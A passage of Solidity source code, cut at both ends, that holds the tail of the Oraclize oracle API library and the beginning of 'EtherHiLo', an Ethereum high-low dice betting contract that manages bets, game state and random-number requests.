tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n using CBOR for Buffer.buffer;\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n safeMemoryCleaner();\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeString(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n safeMemoryCleaner();\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeBytes(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n _delay *= 10;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes memory delay = new bytes(32);\n assembly {\n mstore(add(delay, 0x20), _delay)\n }\n bytes memory delay_bytes8 = new bytes(8);\n copyBytes(delay, 24, 8, delay_bytes8, 0);\n bytes[4] memory args = [unonce, nbytes, sessionKeyHash, delay];\n bytes32 queryId = oraclize_query(\"random\", args, _customGasLimit);\n bytes memory delay_bytes8_left = new bytes(8);\n assembly {\n let x := mload(add(delay_bytes8, 0x20))\n mstore8(add(delay_bytes8_left, 0x27), div(x, 0x100000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x26), div(x, 0x1000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x25), div(x, 0x10000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x24), div(x, 0x100000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x23), div(x, 0x1000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x22), div(x, 0x10000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x21), div(x, 0x100000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x20), div(x, 0x1000000000000000000000000000000000000000000000000))\n }\n oraclize_randomDS_setCommitment(queryId, keccak256(delay_bytes8_left, args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n require(prefix.length == n_random_bytes);\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n function safeMemoryCleaner() internal pure {\n assembly {\n let fmem := mload(0x40)\n codecopy(fmem, codesize, sub(msize, fmem))\n }\n }\n}\npragma solidity ^0.4.11;\ncontract EtherHiLo is usingOraclize, Ownable {\n uint8 constant NUM_DICE_SIDES = 13;\n uint8 constant FAILED_ROLE = 69;\n uint public rngCallbackGas;\n uint public minBet;\n uint public maxBetThresholdPct;\n bool public gameRunning;\n uint public balanceInPlay;\n mapping(address => Game) private gamesInProgress;\n mapping(bytes32 => address) private rollIdToGameAddress;\n mapping(bytes32 => uint) private failedRolls;\n event GameFinished(address indexed player, uint indexed playerGameNumber, uint bet, uint8 firstRoll, uint8 finalRoll, uint winnings, uint payout);\n event GameError(address indexed player, uint indexed playerGameNumber, bytes32 rollId);\n enum BetDirection {\n None,\n Low,\n High\n }\n enum GameState {\n None,\n WaitingForFirstCard,\n WaitingForDirection,\n WaitingForFinalCard,\n Finished\n }\n struct Game {\n address player;\n GameState state;\n uint id;\n BetDirection direction;\n uint bet;\n uint8 firstRoll;\n uint8 finalRoll;\n uint winnings;\n }\n function EtherHiLo() public {\n }\n function() external payable {\n }\n function beginGame() public payable {\n address player = msg.sender;\n uint bet = msg.value;\n require(player != address(0), \"Invalid player\");\n require(gamesInProgress[player].state == GameState.None\n || gamesInProgress[player].state == GameState.Finished,\n \"Invalid game state\");\n require(gameRunning, \"Game is not currently running\");\n require(bet >= minBet && bet <= getMaxBet(), \"Invalid bet\");\n Game memory game = Game({\n id: uint(keccak256(block.number, player, bet)),\n player: player,\n state: GameState.WaitingForFirstCard,\n bet: bet,\n firstRoll: 0,\n finalRoll: 0,\n winnings: 0,\n direction: BetDirection.None\n });\n balanceInPlay = SafeMath.add(balanceInPlay, game.bet);\n gamesInProgress[player] = game;\n require(rollDie(player), \"Dice roll failed\");\n }\n function finishGame(BetDirection direction) public {\n address player = msg.sender;\n require(player != address(0), \"Invalid player\");\n require(gamesInProgress[player].state == GameState.WaitingForDirection,\n \"Invalid game state\");\n Game storage game = gamesInProgress[player];\n game.direction = direction;\n game.state = GameState.WaitingForFinalCard;\n gamesInProgress[player] = game;\n require(rollDie(player), \"Dice roll failed\");\n }\n function getGameState(address player) public view returns\n (GameState, uint, BetDirection, uint, uint8, uint8, uint) {\n return (\n gamesInProgress[player].state,\n gamesInProgress[player].id,\n gamesInProgress[player].direction,\n gamesInProgress[player].bet,\n gamesInProgress[player].firstRoll,\n gamesInProgress[player].finalRoll,\n gamesInProgress[player].winnings\n );\n }\n function getMinBet() public view returns (uint) {\n return minBet;\n }\n function getMaxBet() public view returns (uint) {\n return SafeMath.div(SafeMath.div(SafeMath.mul(SafeMath.sub(this.balance, balanceInPlay), maxBetThresholdPct), 100), 12);\n }\n function calculateWinnings(uint bet, uint percent) public pure returns (uint) {\n return 